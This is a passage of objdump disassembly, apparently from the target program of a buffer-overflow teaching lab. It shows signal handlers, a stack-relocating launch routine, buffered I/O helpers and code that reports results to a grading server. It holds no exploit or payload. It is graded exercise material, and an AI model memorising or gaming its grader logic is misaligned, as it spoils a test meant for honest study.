  4026db:       e9 74 ff ff ff          jmp    402654 <validate+0x48>

00000000004026e0 <fail>:
  4026e0:       f3 0f 1e fa             endbr64
  4026e4:       48 83 ec 08             sub    $0x8,%rsp
  4026e8:       83 3d 69 4e 00 00 00    cmpl   $0x0,0x4e69(%rip)        # 407558 <is_checker>
  4026ef:       75 11                   jne    402702 <fail+0x22>
  4026f1:       89 fe                   mov    %edi,%esi
  4026f3:       bf 00 00 00 00          mov    $0x0,%edi
  4026f8:       e8 e3 fc ff ff          call   4023e0 <notify_server>
  4026fd:       48 83 c4 08             add    $0x8,%rsp
  402701:       c3                      ret
  402702:       b8 00 00 00 00          mov    $0x0,%eax
  402707:       e8 40 fc ff ff          call   40234c <check_fail>

000000000040270c <bushandler>:
  40270c:       f3 0f 1e fa             endbr64
  402710:       50                      push   %rax
  402711:       58                      pop    %rax
  402712:       48 83 ec 08             sub    $0x8,%rsp
  402716:       83 3d 3b 4e 00 00 00    cmpl   $0x0,0x4e3b(%rip)        # 407558 <is_checker>
  40271d:       74 16                   je     402735 <bushandler+0x29>
  40271f:       48 8d 3d 4f 1d 00 00    lea    0x1d4f(%rip),%rdi        # 404475 <_IO_stdin_used+0x475>
  402726:       e8 95 eb ff ff          call   4012c0 <puts@plt>
  40272b:       b8 00 00 00 00          mov    $0x0,%eax
  402730:       e8 17 fc ff ff          call   40234c <check_fail>
  402735:       48 8d 3d a4 1e 00 00    lea    0x1ea4(%rip),%rdi        # 4045e0 <_IO_stdin_used+0x5e0>
  40273c:       e8 7f eb ff ff          call   4012c0 <puts@plt>
  402741:       48 8d 3d 37 1d 00 00    lea    0x1d37(%rip),%rdi        # 40447f <_IO_stdin_used+0x47f>
  402748:       e8 73 eb ff ff          call   4012c0 <puts@plt>
  40274d:       be 00 00 00 00          mov    $0x0,%esi
  402752:       bf 00 00 00 00          mov    $0x0,%edi
  402757:       e8 84 fc ff ff          call   4023e0 <notify_server>
  40275c:       bf 01 00 00 00          mov    $0x1,%edi
  402761:       e8 ca ec ff ff          call   401430 <exit@plt>

0000000000402766 <seghandler>:
  402766:       f3 0f 1e fa             endbr64
  40276a:       50                      push   %rax
  40276b:       58                      pop    %rax
  40276c:       48 83 ec 08             sub    $0x8,%rsp
  402770:       83 3d e1 4d 00 00 00    cmpl   $0x0,0x4de1(%rip)        # 407558 <is_checker>
  402777:       74 16                   je     40278f <seghandler+0x29>
  402779:       48 8d 3d 15 1d 00 00    lea    0x1d15(%rip),%rdi        # 404495 <_IO_stdin_used+0x495>
  402780:       e8 3b eb ff ff          call   4012c0 <puts@plt>
  402785:       b8 00 00 00 00          mov    $0x0,%eax
  40278a:       e8 bd fb ff ff          call   40234c <check_fail>
  40278f:       48 8d 3d 6a 1e 00 00    lea    0x1e6a(%rip),%rdi        # 404600 <_IO_stdin_used+0x600>
  402796:       e8 25 eb ff ff          call   4012c0 <puts@plt>
  40279b:       48 8d 3d dd 1c 00 00    lea    0x1cdd(%rip),%rdi        # 40447f <_IO_stdin_used+0x47f>
  4027a2:       e8 19 eb ff ff          call   4012c0 <puts@plt>
  4027a7:       be 00 00 00 00          mov    $0x0,%esi
  4027ac:       bf 00 00 00 00          mov    $0x0,%edi
  4027b1:       e8 2a fc ff ff          call   4023e0 <notify_server>
  4027b6:       bf 01 00 00 00          mov    $0x1,%edi
  4027bb:       e8 70 ec ff ff          call   401430 <exit@plt>

00000000004027c0 <illegalhandler>:
  4027c0:       f3 0f 1e fa             endbr64
  4027c4:       50                      push   %rax
  4027c5:       58                      pop    %rax
  4027c6:       48 83 ec 08             sub    $0x8,%rsp
  4027ca:       83 3d 87 4d 00 00 00    cmpl   $0x0,0x4d87(%rip)        # 407558 <is_checker>
  4027d1:       74 16                   je     4027e9 <illegalhandler+0x29>
  4027d3:       48 8d 3d ce 1c 00 00    lea    0x1cce(%rip),%rdi        # 4044a8 <_IO_stdin_used+0x4a8>
  4027da:       e8 e1 ea ff ff          call   4012c0 <puts@plt>
  4027df:       b8 00 00 00 00          mov    $0x0,%eax
  4027e4:       e8 63 fb ff ff          call   40234c <check_fail>
  4027e9:       48 8d 3d 38 1e 00 00    lea    0x1e38(%rip),%rdi        # 404628 <_IO_stdin_used+0x628>
  4027f0:       e8 cb ea ff ff          call   4012c0 <puts@plt>
  4027f5:       48 8d 3d 83 1c 00 00    lea    0x1c83(%rip),%rdi        # 40447f <_IO_stdin_used+0x47f>
  4027fc:       e8 bf ea ff ff          call   4012c0 <puts@plt>
  402801:       be 00 00 00 00          mov    $0x0,%esi
  402806:       bf 00 00 00 00          mov    $0x0,%edi
  40280b:       e8 d0 fb ff ff          call   4023e0 <notify_server>
  402810:       bf 01 00 00 00          mov    $0x1,%edi
  402815:       e8 16 ec ff ff          call   401430 <exit@plt>

000000000040281a <sigalrmhandler>:
  40281a:       f3 0f 1e fa             endbr64
  40281e:       50                      push   %rax
  40281f:       58                      pop    %rax
  402820:       48 83 ec 08             sub    $0x8,%rsp
  402824:       83 3d 2d 4d 00 00 00    cmpl   $0x0,0x4d2d(%rip)        # 407558 <is_checker>
  40282b:       74 16                   je     402843 <sigalrmhandler+0x29>
  40282d:       48 8d 3d 88 1c 00 00    lea    0x1c88(%rip),%rdi        # 4044bc <_IO_stdin_used+0x4bc>
  402834:       e8 87 ea ff ff          call   4012c0 <puts@plt>
  402839:       b8 00 00 00 00          mov    $0x0,%eax
  40283e:       e8 09 fb ff ff          call   40234c <check_fail>
  402843:       ba 05 00 00 00          mov    $0x5,%edx
  402848:       48 8d 35 09 1e 00 00    lea    0x1e09(%rip),%rsi        # 404658 <_IO_stdin_used+0x658>
  40284f:       bf 01 00 00 00          mov    $0x1,%edi
  402854:       b8 00 00 00 00          mov    $0x0,%eax
  402859:       e8 82 eb ff ff          call   4013e0 <__printf_chk@plt>
  40285e:       be 00 00 00 00          mov    $0x0,%esi
  402863:       bf 00 00 00 00          mov    $0x0,%edi
  402868:       e8 73 fb ff ff          call   4023e0 <notify_server>
  40286d:       bf 01 00 00 00          mov    $0x1,%edi
  402872:       e8 b9 eb ff ff          call   401430 <exit@plt>

0000000000402877 <launch>:
  402877:       f3 0f 1e fa             endbr64
  40287b:       55                      push   %rbp
  40287c:       48 89 e5                mov    %rsp,%rbp
  40287f:       48 83 ec 10             sub    $0x10,%rsp
  402883:       48 89 fa                mov    %rdi,%rdx
  402886:       64 48 8b 04 25 28 00    mov    %fs:0x28,%rax
  40288d:       00 00
  40288f:       48 89 45 f8             mov    %rax,-0x8(%rbp)
  402893:       31 c0                   xor    %eax,%eax
  402895:       48 8d 47 17             lea    0x17(%rdi),%rax
  402899:       48 89 c6                mov    %rax,%rsi
  40289c:       48 83 e6 f0             and    $0xfffffffffffffff0,%rsi
  4028a0:       48 25 00 f0 ff ff       and    $0xfffffffffffff000,%rax
  4028a6:       48 89 e1                mov    %rsp,%rcx
  4028a9:       48 29 c1                sub    %rax,%rcx
  4028ac:       48 39 cc                cmp    %rcx,%rsp
  4028af:       74 12                   je     4028c3 <launch+0x4c>
  4028b1:       48 81 ec 00 10 00 00    sub    $0x1000,%rsp
  4028b8:       48 83 8c 24 f8 0f 00    orq    $0x0,0xff8(%rsp)
  4028bf:       00 00
  4028c1:       eb e9                   jmp    4028ac <launch+0x35>
  4028c3:       48 89 f0                mov    %rsi,%rax
  4028c6:       25 ff 0f 00 00          and    $0xfff,%eax
  4028cb:       48 29 c4                sub    %rax,%rsp
  4028ce:       48 85 c0                test   %rax,%rax
  4028d1:       74 06                   je     4028d9 <launch+0x62>
  4028d3:       48 83 4c 04 f8 00       orq    $0x0,-0x8(%rsp,%rax,1)
  4028d9:       48 8d 7c 24 0f          lea    0xf(%rsp),%rdi
  4028de:       48 83 e7 f0             and    $0xfffffffffffffff0,%rdi
  4028e2:       be f4 00 00 00          mov    $0xf4,%esi
  4028e7:       e8 24 ea ff ff          call   401310 <memset@plt>
  4028ec:       48 8b 05 cd 4b 00 00    mov    0x4bcd(%rip),%rax        # 4074c0 <stdin@GLIBC_2.2.5>
  4028f3:       48 39 05 46 4c 00 00    cmp    %rax,0x4c46(%rip)        # 407540 <infile>
  4028fa:       74 3a                   je     402936 <launch+0xbf>
  4028fc:       c7 05 46 4c 00 00 00    movl   $0x0,0x4c46(%rip)        # 40754c <vlevel>
  402903:       00 00 00
  402906:       b8 00 00 00 00          mov    $0x0,%eax
  40290b:       e8 cd f7 ff ff          call   4020dd <test>
  402910:       83 3d 41 4c 00 00 00    cmpl   $0x0,0x4c41(%rip)        # 407558 <is_checker>
  402917:       75 35                   jne    40294e <launch+0xd7>
  402919:       48 8d 3d bc 1b 00 00    lea    0x1bbc(%rip),%rdi        # 4044dc <_IO_stdin_used+0x4dc>
  402920:       e8 9b e9 ff ff          call   4012c0 <puts@plt>
  402925:       48 8b 45 f8             mov    -0x8(%rbp),%rax
  402929:       64 48 2b 04 25 28 00    sub    %fs:0x28,%rax
  402930:       00 00
  402932:       75 30                   jne    402964 <launch+0xed>
  402934:       c9                      leave
  402935:       c3                      ret
  402936:       48 8d 35 87 1b 00 00    lea    0x1b87(%rip),%rsi        # 4044c4 <_IO_stdin_used+0x4c4>
  40293d:       bf 01 00 00 00          mov    $0x1,%edi
  402942:       b8 00 00 00 00          mov    $0x0,%eax
  402947:       e8 94 ea ff ff          call   4013e0 <__printf_chk@plt>
  40294c:       eb ae                   jmp    4028fc <launch+0x85>
  40294e:       48 8d 3d 7c 1b 00 00    lea    0x1b7c(%rip),%rdi        # 4044d1 <_IO_stdin_used+0x4d1>
  402955:       e8 66 e9 ff ff          call   4012c0 <puts@plt>
  40295a:       b8 00 00 00 00          mov    $0x0,%eax
  40295f:       e8 e8 f9 ff ff          call   40234c <check_fail>
  402964:       e8 87 e9 ff ff          call   4012f0 <__stack_chk_fail@plt>

0000000000402969 <stable_launch>:
  402969:       f3 0f 1e fa             endbr64
  40296d:       53                      push   %rbx
  40296e:       48 89 3d bb 4b 00 00    mov    %rdi,0x4bbb(%rip)        # 407530 <global_offset>
  402975:       41 b9 00 00 00 00       mov    $0x0,%r9d
  40297b:       41 b8 00 00 00 00       mov    $0x0,%r8d
  402981:       b9 32 01 00 00          mov    $0x132,%ecx
  402986:       ba 07 00 00 00          mov    $0x7,%edx
  40298b:       be 00 00 10 00          mov    $0x100000,%esi
  402990:       bf 00 60 58 55          mov    $0x55586000,%edi
  402995:       e8 66 e9 ff ff          call   401300 <mmap@plt>
  40299a:       48 89 c3                mov    %rax,%rbx
  40299d:       48 3d 00 60 58 55       cmp    $0x55586000,%rax
  4029a3:       75 43                   jne    4029e8 <stable_launch+0x7f>
  4029a5:       48 8d 90 f8 ff 0f 00    lea    0xffff8(%rax),%rdx
  4029ac:       48 89 15 75 4b 00 00    mov    %rdx,0x4b75(%rip)        # 407528 <stack_top>
  4029b3:       48 89 e0                mov    %rsp,%rax
  4029b6:       48 89 d4                mov    %rdx,%rsp
  4029b9:       48 89 c2                mov    %rax,%rdx
  4029bc:       48 89 15 5d 4b 00 00    mov    %rdx,0x4b5d(%rip)        # 407520 <global_save_stack>
  4029c3:       48 8b 3d 66 4b 00 00    mov    0x4b66(%rip),%rdi        # 407530 <global_offset>
  4029ca:       e8 a8 fe ff ff          call   402877 <launch>
  4029cf:       48 8b 05 4a 4b 00 00    mov    0x4b4a(%rip),%rax        # 407520 <global_save_stack>
  4029d6:       48 89 c4                mov    %rax,%rsp
  4029d9:       be 00 00 10 00          mov    $0x100000,%esi
  4029de:       48 89 df                mov    %rbx,%rdi
  4029e1:       e8 ea e9 ff ff          call   4013d0 <munmap@plt>
  4029e6:       5b                      pop    %rbx
  4029e7:       c3                      ret
  4029e8:       be 00 00 10 00          mov    $0x100000,%esi
  4029ed:       48 89 c7                mov    %rax,%rdi
  4029f0:       e8 db e9 ff ff          call   4013d0 <munmap@plt>
  4029f5:       b9 00 60 58 55          mov    $0x55586000,%ecx
  4029fa:       48 8d 15 8f 1c 00 00    lea    0x1c8f(%rip),%rdx        # 404690 <_IO_stdin_used+0x690>
  402a01:       be 01 00 00 00          mov    $0x1,%esi
  402a06:       48 8b 3d f3 4a 00 00    mov    0x4af3(%rip),%rdi        # 407500 <stderr@GLIBC_2.2.5>
  402a0d:       b8 00 00 00 00          mov    $0x0,%eax
  402a12:       e8 39 ea ff ff          call   401450 <__fprintf_chk@plt>
  402a17:       bf 01 00 00 00          mov    $0x1,%edi
  402a1c:       e8 0f ea ff ff          call   401430 <exit@plt>

0000000000402a21 <rio_readinitb>:
  402a21:       89 37                   mov    %esi,(%rdi)
  402a23:       c7 47 04 00 00 00 00    movl   $0x0,0x4(%rdi)
  402a2a:       48 8d 47 10             lea    0x10(%rdi),%rax
  402a2e:       48 89 47 08             mov    %rax,0x8(%rdi)
  402a32:       c3                      ret

0000000000402a33 <sigalrm_handler>:
  402a33:       f3 0f 1e fa             endbr64
  402a37:       50                      push   %rax
  402a38:       58                      pop    %rax
  402a39:       48 83 ec 08             sub    $0x8,%rsp
  402a3d:       b9 00 00 00 00          mov    $0x0,%ecx
  402a42:       48 8d 15 87 1c 00 00    lea    0x1c87(%rip),%rdx        # 4046d0 <trans_char+0x10>
  402a49:       be 01 00 00 00          mov    $0x1,%esi
  402a4e:       48 8b 3d ab 4a 00 00    mov    0x4aab(%rip),%rdi        # 407500 <stderr@GLIBC_2.2.5>
  402a55:       b8 00 00 00 00          mov    $0x0,%eax
  402a5a:       e8 f1 e9 ff ff          call   401450 <__fprintf_chk@plt>
  402a5f:       bf 01 00 00 00          mov    $0x1,%edi
  402a64:       e8 c7 e9 ff ff          call   401430 <exit@plt>

0000000000402a69 <rio_writen>:
  402a69:       41 55                   push   %r13
  402a6b:       41 54                   push   %r12
  402a6d:       55                      push   %rbp
  402a6e:       53                      push   %rbx
  402a6f:       48 83 ec 08             sub    $0x8,%rsp
  402a73:       41 89 fc                mov    %edi,%r12d
  402a76:       48 89 f5                mov    %rsi,%rbp
  402a79:       49 89 d5                mov    %rdx,%r13
  402a7c:       48 89 d3                mov    %rdx,%rbx
  402a7f:       eb 06                   jmp    402a87 <rio_writen+0x1e>
  402a81:       48 29 c3                sub    %rax,%rbx
  402a84:       48 01 c5                add    %rax,%rbp
  402a87:       48 85 db                test   %rbx,%rbx
  402a8a:       74 24                   je     402ab0 <rio_writen+0x47>
  402a8c:       48 89 da                mov    %rbx,%rdx
  402a8f:       48 89 ee                mov    %rbp,%rsi
  402a92:       44 89 e7                mov    %r12d,%edi
  402a95:       e8 36 e8 ff ff          call   4012d0 <write@plt>
  402a9a:       48 85 c0                test   %rax,%rax
  402a9d:       7f e2                   jg     402a81 <rio_writen+0x18>
  402a9f:       e8 cc e7 ff ff          call   401270 <__errno_location@plt>
  402aa4:       83 38 04                cmpl   $0x4,(%rax)
  402aa7:       75 15                   jne    402abe <rio_writen+0x55>
  402aa9:       b8 00 00 00 00          mov    $0x0,%eax
  402aae:       eb d1                   jmp    402a81 <rio_writen+0x18>
  402ab0:       4c 89 e8                mov    %r13,%rax
  402ab3:       48 83 c4 08             add    $0x8,%rsp
  402ab7:       5b                      pop    %rbx
  402ab8:       5d                      pop    %rbp
  402ab9:       41 5c                   pop    %r12
  402abb:       41 5d                   pop    %r13
  402abd:       c3                      ret
  402abe:       48 c7 c0 ff ff ff ff    mov    $0xffffffffffffffff,%rax
  402ac5:       eb ec                   jmp    402ab3 <rio_writen+0x4a>

0000000000402ac7 <rio_read>:
  402ac7:       41 55                   push   %r13
  402ac9:       41 54                   push   %r12
  402acb:       55                      push   %rbp
  402acc:       53                      push   %rbx
  402acd:       48 83 ec 08             sub    $0x8,%rsp
  402ad1:       48 89 fb                mov    %rdi,%rbx
  402ad4:       49 89 f5                mov    %rsi,%r13
  402ad7:       49 89 d4                mov    %rdx,%r12
  402ada:       eb 0a                   jmp    402ae6 <rio_read+0x1f>
  402adc:       e8 8f e7 ff ff          call   401270 <__errno_location@plt>
  402ae1:       83 38 04                cmpl   $0x4,(%rax)
  402ae4:       75 61                   jne    402b47 <rio_read+0x80>
  402ae6:       8b 6b 04                mov    0x4(%rbx),%ebp
  402ae9:       85 ed                   test   %ebp,%ebp
  402aeb:       7f 29                   jg     402b16 <rio_read+0x4f>
  402aed:       48 8d 6b 10             lea    0x10(%rbx),%rbp
  402af1:       8b 3b                   mov    (%rbx),%edi
  402af3:       48 c7 c1 ff ff ff ff    mov    $0xffffffffffffffff,%rcx
  402afa:       ba 00 20 00 00          mov    $0x2000,%edx
  402aff:       48 89 ee                mov    %rbp,%rsi
  402b02:       e8 a9 e7 ff ff          call   4012b0 <__read_chk@plt>
  402b07:       89 43 04                mov    %eax,0x4(%rbx)
  402b0a:       85 c0                   test   %eax,%eax
  402b0c:       78 ce                   js     402adc <rio_read+0x15>
  402b0e:       74 40                   je     402b50 <rio_read+0x89>
  402b10:       48 89 6b 08             mov    %rbp,0x8(%rbx)
  402b14:       eb d0                   jmp    402ae6 <rio_read+0x1f>
  402b16:       89 e8                   mov    %ebp,%eax
  402b18:       4c 39 e0                cmp    %r12,%rax
  402b1b:       72 03                   jb     402b20 <rio_read+0x59>
  402b1d:       44 89 e5                mov    %r12d,%ebp
  402b20:       4c 63 e5                movslq %ebp,%r12
  402b23:       48 8b 73 08             mov    0x8(%rbx),%rsi
  402b27:       4c 89 e2                mov    %r12,%rdx
  402b2a:       4c 89 ef                mov    %r13,%rdi
  402b2d:       e8 5e e8 ff ff          call   401390 <memcpy@plt>
  402b32:       4c 01 63 08             add    %r12,0x8(%rbx)
  402b36:       29 6b 04                sub    %ebp,0x4(%rbx)
  402b39:       4c 89 e0                mov    %r12,%rax
  402b3c:       48 83 c4 08             add    $0x8,%rsp
  402b40:       5b                      pop    %rbx
  402b41:       5d                      pop    %rbp
  402b42:       41 5c                   pop    %r12
  402b44:       41 5d                   pop    %r13
  402b46:       c3                      ret
  402b47:       48 c7 c0 ff ff ff ff    mov    $0xffffffffffffffff,%rax
  402b4e:       eb ec                   jmp    402b3c <rio_read+0x75>
  402b50:       b8 00 00 00 00          mov    $0x0,%eax
  402b55:       eb e5                   jmp    402b3c <rio_read+0x75>

0000000000402b57 <rio_readlineb>:
  402b57:       41 55                   push   %r13
  402b59:       41 54                   push   %r12
  402b5b:       55                      push   %rbp
  402b5c:       53                      push   %rbx
  402b5d:       48 83 ec 18             sub    $0x18,%rsp
  402b61:       49 89 fd                mov    %rdi,%r13
  402b64:       48 89 f5                mov    %rsi,%rbp
  402b67:       49 89 d4                mov    %rdx,%r12
  402b6a:       64 48 8b 04 25 28 00    mov    %fs:0x28,%rax
  402b71:       00 00
  402b73:       48 89 44 24 08          mov    %rax,0x8(%rsp)
  402b78:       31 c0                   xor    %eax,%eax
  402b7a:       bb 01 00 00 00          mov    $0x1,%ebx
  402b7f:       eb 18                   jmp    402b99 <rio_readlineb+0x42>
  402b81:       85 c0                   test   %eax,%eax
  402b83:       75 65                   jne    402bea <rio_readlineb+0x93>
  402b85:       48 83 fb 01             cmp    $0x1,%rbx
  402b89:       75 3d                   jne    402bc8 <rio_readlineb+0x71>
  402b8b:       b8 00 00 00 00          mov    $0x0,%eax
  402b90:       eb 3d                   jmp    402bcf <rio_readlineb+0x78>
  402b92:       48 83 c3 01             add    $0x1,%rbx
  402b96:       48 89 d5                mov    %rdx,%rbp
  402b99:       4c 39 e3                cmp    %r12,%rbx
  402b9c:       73 2a                   jae    402bc8 <rio_readlineb+0x71>
  402b9e:       48 8d 74 24 07          lea    0x7(%rsp),%rsi
  402ba3:       ba 01 00 00 00          mov    $0x1,%edx
  402ba8:       4c 89 ef                mov    %r13,%rdi
  402bab:       e8 17 ff ff ff          call   402ac7 <rio_read>
  402bb0:       83 f8 01                cmp    $0x1,%eax
  402bb3:       75 cc                   jne    402b81 <rio_readlineb+0x2a>
  402bb5:       48 8d 55 01             lea    0x1(%rbp),%rdx
  402bb9:       0f b6 44 24 07          movzbl 0x7(%rsp),%eax
  402bbe:       88 45 00                mov    %al,0x0(%rbp)
  402bc1:       3c 0a                   cmp    $0xa,%al
  402bc3:       75 cd                   jne    402b92 <rio_readlineb+0x3b>
  402bc5:       48 89 d5                mov    %rdx,%rbp
  402bc8:       c6 45 00 00             movb   $0x0,0x0(%rbp)
  402bcc:       48 89 d8                mov    %rbx,%rax
  402bcf:       48 8b 54 24 08          mov    0x8(%rsp),%rdx
  402bd4:       64 48 2b 14 25 28 00    sub    %fs:0x28,%rdx
  402bdb:       00 00
  402bdd:       75 14                   jne    402bf3 <rio_readlineb+0x9c>
  402bdf:       48 83 c4 18             add    $0x18,%rsp
  402be3:       5b                      pop    %rbx
  402be4:       5d                      pop    %rbp
  402be5:       41 5c                   pop    %r12
  402be7:       41 5d                   pop    %r13
  402be9:       c3                      ret
  402bea:       48 c7 c0 ff ff ff ff    mov    $0xffffffffffffffff,%rax
  402bf1:       eb dc                   jmp    402bcf <rio_readlineb+0x78>
  402bf3:       e8 f8 e6 ff ff          call   4012f0 <__stack_chk_fail@plt>

0000000000402bf8 <urlencode>:
  402bf8:       41 54                   push   %r12
  402bfa:       55                      push   %rbp
  402bfb:       53                      push   %rbx
  402bfc:       48 83 ec 10             sub    $0x10,%rsp
  402c00:       48 89 fb                mov    %rdi,%rbx
  402c03:       48 89 f5                mov    %rsi,%rbp
  402c06:       64 48 8b 04 25 28 00    mov    %fs:0x28,%rax
  402c0d:       00 00
  402c0f:       48 89 44 24 08          mov    %rax,0x8(%rsp)
  402c14:       31 c0                   xor    %eax,%eax
  402c16:       e8 c5 e6 ff ff          call   4012e0 <strlen@plt>
  402c1b:       eb 0f                   jmp    402c2c <urlencode+0x34>
  402c1d:       44 88 45 00             mov    %r8b,0x0(%rbp)
  402c21:       48 8d 6d 01             lea    0x1(%rbp),%rbp
  402c25:       48 83 c3 01             add    $0x1,%rbx
  402c29:       44 89 e0                mov    %r12d,%eax
  402c2c:       44 8d 60 ff             lea    -0x1(%rax),%r12d
  402c30:       85 c0                   test   %eax,%eax
  402c32:       0f 84 a8 00 00 00       je     402ce0 <urlencode+0xe8>
  402c38:       44 0f b6 03             movzbl (%rbx),%r8d
  402c3c:       41 80 f8 2a             cmp    $0x2a,%r8b
  402c40:       0f 94 c0                sete   %al
  402c43:       41 80 f8 2d             cmp    $0x2d,%r8b
  402c47:       0f 94 c2                sete   %dl
  402c4a:       08 d0                   or     %dl,%al
  402c4c:       75 cf                   jne    402c1d <urlencode+0x25>
  402c4e:       41 80 f8 2e             cmp    $0x2e,%r8b
  402c52:       74 c9                   je     402c1d <urlencode+0x25>
  402c54:       41 80 f8 5f             cmp    $0x5f,%r8b
  402c58:       74 c3                   je     402c1d <urlencode+0x25>
  402c5a:       41 8d 40 d0             lea    -0x30(%r8),%eax
  402c5e:       3c 09                   cmp    $0x9,%al
  402c60:       76 bb                   jbe    402c1d <urlencode+0x25>
  402c62:       41 8d 40 bf             lea    -0x41(%r8),%eax
  402c66:       3c 19                   cmp    $0x19,%al
  402c68:       76 b3                   jbe    402c1d <urlencode+0x25>
  402c6a:       41 8d 40 9f             lea    -0x61(%r8),%eax
  402c6e:       3c 19                   cmp    $0x19,%al
  402c70:       76 ab                   jbe    402c1d <urlencode+0x25>
  402c72:       41 80 f8 20             cmp    $0x20,%r8b
  402c76:       74 56                   je     402cce <urlencode+0xd6>
  402c78:       41 8d 40 e0             lea    -0x20(%r8),%eax
  402c7c:       3c 5f                   cmp    $0x5f,%al
  402c7e:       0f 96 c0                setbe  %al
  402c81:       41 80 f8 09             cmp    $0x9,%r8b
  402c85:       0f 94 c2                sete   %dl
  402c88:       08 d0                   or     %dl,%al
  402c8a:       74 4f                   je     402cdb <urlencode+0xe3>
  402c8c:       48 89 e7                mov    %rsp,%rdi
  402c8f:       45 0f b6 c0             movzbl %r8b,%r8d
  402c93:       48 8d 0d cb 1a 00 00    lea    0x1acb(%rip),%rcx        # 404765 <trans_char+0xa5>
  402c9a:       ba 08 00 00 00          mov    $0x8,%edx
  402c9f:       be 01 00 00 00          mov    $0x1,%esi
  402ca4:       b8 00 00 00 00          mov    $0x0,%eax
  402ca9:       e8 c2 e7 ff ff          call   401470 <__sprintf_chk@plt>
  402cae:       0f b6 04 24             movzbl (%rsp),%eax
  402cb2:       88 45 00                mov    %al,0x0(%rbp)
  402cb5:       0f b6 44 24 01          movzbl 0x1(%rsp),%eax
  402cba:       88 45 01                mov    %al,0x1(%rbp)
  402cbd:       0f b6 44 24 02          movzbl 0x2(%rsp),%eax
  402cc2:       88 45 02                mov    %al,0x2(%rbp)
  402cc5:       48 8d 6d 03             lea    0x3(%rbp),%rbp
  402cc9:       e9 57 ff ff ff          jmp    402c25 <urlencode+0x2d>
  402cce:       c6 45 00 2b             movb   $0x2b,0x0(%rbp)
  402cd2:       48 8d 6d 01             lea    0x1(%rbp),%rbp
  402cd6:       e9 4a ff ff ff          jmp    402c25 <urlencode+0x2d>
  402cdb:       b8 ff ff ff ff          mov    $0xffffffff,%eax
  402ce0:       48 8b 54 24 08          mov    0x8(%rsp),%rdx
  402ce5:       64 48 2b 14 25 28 00    sub    %fs:0x28,%rdx
  402cec:       00 00
  402cee:       75 09                   jne    402cf9 <urlencode+0x101>
  402cf0:       48 83 c4 10             add    $0x10,%rsp
  402cf4:       5b                      pop    %rbx
  402cf5:       5d                      pop    %rbp
  402cf6:       41 5c                   pop    %r12
  402cf8:       c3                      ret
  402cf9:       e8 f2 e5 ff ff          call   4012f0 <__stack_chk_fail@plt>

0000000000402cfe <submitr>:
  402cfe:       f3 0f 1e fa             endbr64
  402d02:       41 57                   push   %r15
  402d04:       41 56                   push   %r14
  402d06:       41 55                   push   %r13
  402d08:       41 54                   push   %r12
  402d0a:       55                      push   %rbp
  402d0b:       53                      push   %rbx
  402d0c:       4c 8d 9c 24 00 60 ff    lea    -0xa000(%rsp),%r11
  402d13:       ff
  402d14:       48 81 ec 00 10 00 00    sub    $0x1000,%rsp
  402d1b:       48 83 0c 24 00          orq    $0x0,(%rsp)
  402d20:       4c 39 dc                cmp    %r11,%rsp
  402d23:       75 ef                   jne    402d14 <submitr+0x16>
  402d25:       48 83 ec 68             sub    $0x68,%rsp
  402d29:       49 89 fc                mov    %rdi,%r12
  402d2c:       89 74 24 10             mov    %esi,0x10(%rsp)
  402d30:       49 89 d6                mov    %rdx,%r14
  402d33:       48 89 4c 24 08          mov    %rcx,0x8(%rsp)
  402d38:       4c 89 44 24 18          mov    %r8,0x18(%rsp)
  402d3d:       4d 89 cd                mov    %r9,%r13
  402d40:       48 8b ac 24 a0 a0 00    mov    0xa0a0(%rsp),%rbp
  402d47:       00
  402d48:       64 48 8b 04 25 28 00    mov    %fs:0x28,%rax
  402d4f:       00 00
  402d51:       48 89 84 24 58 a0 00    mov    %rax,0xa058(%rsp)
  402d58:       00
  402d59:       31 c0                   xor    %eax,%eax
  402d5b:       c7 44 24 2c 00 00 00    movl   $0x0,0x2c(%rsp)
  402d62:       00
  402d63:       ba 00 00 00 00          mov    $0x0,%edx
  402d68:       be 01 00 00 00          mov    $0x1,%esi
  402d6d:       bf 02 00 00 00          mov    $0x2,%edi
  402d72:       e8 09 e7 ff ff          call   401480 <socket@plt>
  402d77:       85 c0                   test   %eax,%eax
  402d79:       0f 88 77 02 00 00       js     402ff6 <submitr+0x2f8>
  402d7f:       89 c3                   mov    %eax,%ebx
  402d81:       4c 89 e7                mov    %r12,%rdi
  402d84:       e8 d7 e5 ff ff          call   401360 <gethostbyname@plt>
  402d89:       48 85 c0                test   %rax,%rax
  402d8c:       0f 84 b0 02 00 00       je     403042 <submitr+0x344>
  402d92:       4c 8d 7c 24 30          lea    0x30(%rsp),%r15
  402d97:       48 c7 44 24 30 00 00    movq   $0x0,0x30(%rsp)
  402d9e:       00 00
  402da0:       48 c7 44 24 38 00 00    movq   $0x0,0x38(%rsp)
  402da7:       00 00
  402da9:       66 c7 44 24 30 02 00    movw   $0x2,0x30(%rsp)
  402db0:       48 63 50 14             movslq 0x14(%rax),%rdx
  402db4:       48 8b 40 18             mov    0x18(%rax),%rax
  402db8:       48 8b 30                mov    (%rax),%rsi
  402dbb:       48 8d 7c 24 34          lea    0x34(%rsp),%rdi
  402dc0:       b9 0c 00 00 00          mov    $0xc,%ecx
  402dc5:       e8 a6 e5 ff ff          call   401370 <__memmove_chk@plt>
  402dca:       0f b7 44 24 10          movzwl 0x10(%rsp),%eax
  402dcf:       66 c1 c0 08             rol    $0x8,%ax
  402dd3:       66 89 44 24 32          mov    %ax,0x32(%rsp)
  402dd8:       ba 10 00 00 00          mov    $0x10,%edx
  402ddd:       4c 89 fe                mov    %r15,%rsi
  402de0:       89 df                   mov    %ebx,%edi
  402de2:       e8 59 e6 ff ff          call   401440 <connect@plt>
  402de7:       85 c0                   test   %eax,%eax
  402de9:       0f 88 bb 02 00 00       js     4030aa <submitr+0x3ac>
  402def:       4c 89 ef                mov    %r13,%rdi
  402df2:       e8 e9 e4 ff ff          call   4012e0 <strlen@plt>
  402df7:       49 89 c7                mov    %rax,%r15
  402dfa:       4c 89 f7                mov    %r14,%rdi
  402dfd:       e8 de e4 ff ff          call   4012e0 <strlen@plt>
  402e02:       48 89 44 24 10          mov    %rax,0x10(%rsp)
  402e07:       48 8b 7c 24 08          mov    0x8(%rsp),%rdi
  402e0c:       e8 cf e4 ff ff          call   4012e0 <strlen@plt>
  402e11:       48 03 44 24 10          add    0x10(%rsp),%rax
  402e16:       48 89 44 24 10          mov    %rax,0x10(%rsp)
  402e1b:       48 8b 7c 24 18          mov    0x18(%rsp),%rdi
  402e20:       e8 bb e4 ff ff          call   4012e0 <strlen@plt>
  402e25:       48 03 44 24 10          add    0x10(%rsp),%rax
  402e2a:       4b 8d 14 7f             lea    (%r15,%r15,2),%rdx
